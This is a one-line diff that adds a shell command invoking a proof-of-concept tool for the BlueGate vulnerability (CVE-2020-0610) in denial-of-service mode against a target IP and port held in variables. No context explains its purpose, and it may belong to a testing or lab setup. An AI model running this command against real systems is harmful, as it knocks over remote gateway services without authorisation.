@@ -1,0 +1,1 @@
+poc_bluegate_cve20200610 -M dos -P $TARGET_PORT $TARGET_IP
